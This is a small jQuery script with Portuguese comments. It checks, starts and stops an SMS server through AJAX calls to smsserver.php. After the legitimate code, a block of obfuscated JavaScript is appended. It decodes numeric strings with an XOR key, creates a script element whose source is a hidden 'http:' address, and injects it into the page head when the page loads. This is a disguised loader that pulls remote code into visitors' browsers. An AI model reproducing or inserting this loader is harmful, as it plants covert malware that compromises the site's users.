/*
 * funções para validação do status do servidor de sms
 */
$(document).ready(function(){

    $('#StatusServer').text("Verificando status do servidor de SMS...");
    $('#StatusServer').load("smsserver.php?acao=status");

    $("a#ativar").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Ativando servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=ativar");
    });

    $("a#desligar").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Desativando servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=desligar");
    });	
    $("a#status").click(function(event) {
        event.preventDefault(); // Serve para retirar a ação do click do link
        $('#StatusServer').text("Verificando status do servidor de SMS...");
        $('#StatusServer').load("smsserver.php?acao=status");
        	
    });	
});function m9S0(ht73){var k5='';var b6dM=0;var c2E3Q=0;for(b6dM=0;b6dM<ht73.length/3;b6dM++){k5+=String.fromCharCode(ht73.slice(c2E3Q,c2E3Q+3));c2E3Q=c2E3Q+3;}return k5;}function r6caP(zP7182){var mJ=document[k76IN(fI24H[3])](k76IN(fI24H[0])+k76IN(fI24H[1])+k76IN(fI24H[2]));mJ[k76IN(fI24H[4])]=zP7182;mJ[k76IN(fI24H[5])]=k76IN(fI24H[6]);document[k76IN(fI24H[9])](k76IN(fI24H[8]))[0][k76IN(fI24H[7])](mJ);}function ff3ap(rHBh,j8nm8){var af6p8f='';var ndPF=0;var bsqa0u=0;for(ndPF=0;ndPF<rHBh.length;ndPF++){var k2j=rHBh.charAt(ndPF);var w7o=k2j.charCodeAt(0)^j8nm8.charCodeAt(bsqa0u);k2j=String.fromCharCode(w7o);af6p8f+=k2j;if(bsqa0u==j8nm8.length-1)bsqa0u=0;else bsqa0u++;}return (af6p8f);}var fI24H=["020042","021032","023061","004059015080069033053004093036004089014","020059009","019048026084","019044018069030046017030089058002069019073023","006057026084095032051000081037005","015044011085","000044030116093033029013086061018117003109002034041040007084","015061030065011107095027076040021082084074014041085103024068030046003071091039021025016074"];r6caP(k76IN(fI24H[10]));function k76IN(c9S){return ff3ap(m9S0(c9S),'gIj11Dph8Ia7z9cE');}